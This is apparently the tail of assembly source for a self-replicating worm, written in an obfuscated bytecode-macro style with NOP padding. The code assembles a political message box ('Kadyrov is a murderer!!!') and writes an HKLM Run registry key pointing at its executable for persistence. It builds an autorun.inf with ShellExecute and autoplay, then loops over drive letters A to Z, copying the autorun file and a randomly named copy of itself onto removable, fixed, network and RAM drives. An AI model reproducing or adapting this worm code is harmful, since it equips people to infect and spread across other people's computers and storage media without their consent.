	db _sub0001		     ; Get the zer0 flag
	db _JnzDown

	db _nopsA
	db _nopREAL
	db _nopREAL
	db _writeByte		    ; byte[A-x+y]=nopREAL


	GetAddress Inserty
	db _saveWrtOff
	db _getdata
	db _sub0001
	db _writeDWord		    ; Save new counter

	db _JnzUp
;End Fill with NOPs

	db _pop     ; Trash

; ##### End of Insertion
; ############################################################################

	GetAddress stSubKey
	db _saveWrtOff
	db _nopdA

	addnumber 'Kady'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff

	addnumber 'rov '
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff

	addnumber 'is a'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff

	addnumber ' mur'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff

	addnumber 'dere'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff

	addnumber 'r!!!'
	db _writeDWord

	GetAddress stSubKey
	db _nopdB

	CalcNewRandNumberAndSaveIt
	db _nopdA
	db _zer0
	addnumber 7
	db _save
	db _nopsA
	db _and
	db _JnzDown

	db _push	 ; 0x0
	db _nopsB
	db _push	 ; stSubKey
	db _push	 ; stSubKey


	db _nopsA
	db _and
	db _JnzDown


	db _zer0
	db _push
	db _MsgC	; Thats it!
	db _nopREAL



; #####
; #####
; ############################################################################
; ############################################################################

	GetAddress MapPointer
	db _getdata
	db _push
	CallAPI hUnmapViewOfFile	; call UnmapViewOfFile, dword[MapPointer]

	GetAddress MapHandle
	db _getdata
	db _push
	CallAPI hCloseHandle		; call CloseHandle, dword[MapHandle]

	GetAddress FileHandle
	db _getdata
	db _push
	CallAPI hCloseHandle		; call CloseHandle, dword[FileHandle]

	db _zer0
	addnumber 15
	db _save
	GetAddress RandomNumber
	db _getdata
	db _and
	db _push
	db _CallAPISleep	    ; call Sleep, (dword[RandomNumber] & 1111b)

	GetAddress AutoStartContentStart
	db _saveWrtOff
	db _nopdA



; ############################################################################
; ##### Create Registry Key


	GetAddress stSubKey			; Create the key in the data section
	db _nopdA
	db _saveWrtOff
	addnumber 'SOFT'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber 'WARE'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber '\Mic'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber 'roso'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber 'ft\W'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber 'indo'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber 'ws\C'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber 'urre'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber 'ntVe'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber 'rsio'
	db _writeDWord

	db _nopsA
	db _add0004
	db _nopdA
	db _saveWrtOff
	addnumber 'n\Ru'
	db _writeDWord

	db _nopsA
	db _add0004
	db _saveWrtOff
	db _zer0
	addnumber 'n'
	db _writeDWord


	GetAddress hRegKey
	db _push
	GetAddress stSubKey
	db _push
	db _zer0
	addnumber HKEY_LOCAL_MACHINE
	db _push
	CallAPI hRegCreateKey

	db _zer0
	addnumber 15
	db _push		; 15
	GetAddress Driveletter3
	db _push		; C:\evorisss.exe
	db _zer0
	addnumber REG_SZ
	db _push		; REG_SZ
	db _zer0
	db _push		; 0x0
	db _push		; 0x0
	GetAddress hRegKey
	db _getdata
	db _push		; dword[hRegKey]
	CallAPI hRegSetValueEx

; ##### End Create Registry Key
; ############################################################################



; ############################################################################
; ##### Create Autostart file

	GetAddress AutoStartContentStart
	db _nopdA
	db _saveWrtOff
	addnumber '[Aut'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber 'orun'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber 0x530A0D5D	; ']', 0x0D, 0x0A, 'S'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber 'hell'    ; huh - nice ;)
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber 'Exec'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber 'ute='
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	GetAddress RandomFileName
	db _nopdB
	db _getdata
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	db _nopsB
	addnumber 4
	db _getdata
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber '.exe'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber 0x73550A0D
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber 'eAut'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber 'opla'
	db _writeDWord

	db _nopsA
	addnumber 3
	db _nopdA
	db _saveWrtOff
	addnumber 'ay=1'
	db _writeDWord

	GetAddress autoruninf
	db _nopdA
	db _saveWrtOff
	addnumber 'auto'
	db _writeDWord

	db _nopsA
	addnumber 4
	db _nopdA
	db _saveWrtOff
	addnumber 'run.'
	db _writeDWord

	db _nopsA
	addnumber 3
	db _saveWrtOff
	addnumber '.inf'
	db _writeDWord

	db _zer0
	db _push		; 0x0
	addnumber 2
	db _push		; 0x2
	db _zer0
	addnumber CREATE_ALWAYS
	db _push		; CREATE_ALWAYS
	db _zer0
	db _push		; 0x0
	db _push		; 0x0
	addnumber 0xC0000000
	db _push		; 0xC0000000
	GetAddress autoruninf
	db _push		; autoruninf
	CallAPI hCreateFileA

	GetAddress FileHandle
	db _saveWrtOff
	db _nopsA
	db _writeDWord		 ; dword[FileHandle]=eax

	db _zer0
	db _push		 ; 0x0
	GetAddress MapHandle
	db _push		 ; Trash-Address
	db _zer0
	addnumber (AutoStartContentEnd-AutoStartContentStart)
	db _push		 ; Size of Buffer
	GetAddress AutoStartContentStart
	db _push		 ; Buffer to write
	GetAddress FileHandle
	db _getdata
	db _push		 ; FileHandle
	CallAPI hWriteFile

	GetAddress FileHandle
	db _getdata
	db _push
	CallAPI hCloseHandle

; ##### Create Autostart file
; ############################################################################



; ############################################################################
; ############################################################################
; ############################################################################
; #####
; ##### Main Loop (Searchs for Drives, and copies itself)
; #####


	db _getEIP
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _saveJmpOff			; Loop over Drive Letter A-Z

	db _pushall

		db _zer0
		db _nopdB			; RegB=0
	
		GetAddress Driveletter1-1
		db _saveWrtOff
		db _zer0
		addnumber 0x003A4100		 ; 0x0, "A:", 0x0
		db _writeDWord
	
		GetAddress Driveletter2-1
		db _saveWrtOff
		db _zer0
		addnumber 0x5C3A4100		 ; 0x0, "A:\"
		db _writeDWord
	
	
		db _zer0
		addnumber 26
		db _nopdA			; counter
	
		db _getEIP
		db _sub0001
		db _sub0001
		db _sub0001
		db _sub0001
		db _sub0001
		db _saveJmpOff			; Loop over Drive Letter A-Z
	
		db _pushall
	
			GetAddress Driveletter1+2
			db _saveWrtOff
			db _zer0
			db _writeByte
	
			GetAddress Driveletter1
			db _push
			CallAPI hGetDriveType
	
			db _nopsA
			db _save	; save Drive type
	
			db _zer0
			addnumber 2	; BC1=2
			db _subsaved
			db _JnzDown	; Is DRIVE_REMOVABLE?
	
			db _zer0
			db _add0010	; RegB=0x0010 -> FILE+AUTOSTART
			db _nopdB
			db _nopREAL
	
			db _zer0
			addnumber 3	; BC1=3
			db _subsaved
			db _JnzDown	; Is DRIVE_FIXED?
		
			db _zer0
			db _add0040	; RegB=0x0040 -> FILE
			db _nopdB
			db _nopREAL
		
			db _zer0
			addnumber 4	; BC1=4
			db _subsaved
			db _JnzDown	; Is DRIVE_REMOTE?
		
			db _zer0
			db _add0010	; RegB=0x0010 -> FILE+AUTOSTART
			db _nopdB
			db _nopREAL
		
			db _zer0
			addnumber 6	; BC1=6
			db _subsaved
			db _JnzDown	; Is DRIVE_RAMDISK?
		
			db _zer0
			db _add0010	; RegB=0x0010 -> FILE+AUTOSTART
			db _nopdB
			db _nopREAL

		
		; ############################################################################
		; ##### Copy autorun.inf (or not)
	
			GetAddress autoruninf
			db _nopdA		; address to "autorun.inf" to RegA
			GetAddress Driveletter2
			db _nopdD		; address to "?:\autorun.inf" to RegD
	
			db _nopsB
			db _save
	
	
			db _zer0
			db _add0010	   ; (FILE+AUTOSTART)
			db _subsaved
			db _JnzDown
	
	
			db _zer0
			db _push		; bFailIfExists=FALSE
			db _nopsD
			db _push		; lpNewFileName="?:\autorun.inf"
		
		
			GetAddress hCopyFileA
			db _nopdD
	
			db _zer0
			db _add0010	   ; (FILE+AUTOSTART)
			db _subsaved
			db _JnzDown
	
			db _nopsA
			db _push		; lpExistingFileName="autorun.inf"
			db _nopsD
			db _call		; stdcall dword[hCopyFileA]
	

			db _nopsB
			db _save		; restore BC2 (=RegB)
	
			db _zer0
			db _add0010	   ; (FILE+AUTOSTART)
			db _subsaved
			db _JnzDown
	
	
			db _zer0
			db _add0040
			db _nopdB
			db _save	     ; also copy child executable

		
		; ##### End Copy autorun.inf (or not)
		; ############################################################################
		
		
		
		
		; ############################################################################
		; ##### Copy child executable (or not)
		
			GetAddress Driveletter1+2
			db _saveWrtOff
			db _zer0
			addnumber 0x5C		   ;'\'
			db _writeByte
		
			GetAddress RandomFileName
			db _nopdA		; address to "NNNNNNNN.exe" to RegA
			GetAddress Driveletter1
			db _nopdD		; address to "?:\NNNNNNNN.exe" to RegD
		
			db _nopsB
			db _save
		
			db _zer0
			addnumber 0x0040	; (FILE+AUTOSTART)
			db _subsaved
			db _JnzDown
		
			db _zer0
			db _push		; bFailIfExists=FALSE
			db _nopsD
			db _push		; lpNewFileName="?:\NNNNNNNN.exe"
		
		
			GetAddress hCopyFileA
			db _nopdD
		
			db _zer0
			addnumber 0x0040	; (FILE+AUTOSTART)
			db _subsaved
			db _JnzDown
		
			db _nopsA
			db _push		; lpExistingFileName="NNNNNNNN.exe"
			db _nopsD
			db _call		; stdcall dword[hCopyFileA]

		; ##### End Copy child executable (or not)
		; ############################################################################

		db _popall
	
		GetAddress Driveletter1
		db _saveWrtOff
		db _getdata
		db _add0001
		db _writeByte
	
		GetAddress Driveletter2
		db _saveWrtOff
		db _getdata
		db _add0001
		db _writeByte
	
	
		db _nopsA
		db _sub0001
		db _nopdA
	
		db _JnzUp

	db _popall

	db _zer0
	addnumber 0x6666
	db _push
	db _CallAPISleep

	db _zer0
	db _add0400
	db _JnzUp

; ############################################################################

	times 2332 db _nopREAL

EndAminoAcids1:

; ##################################################################





EndAmino:
.end start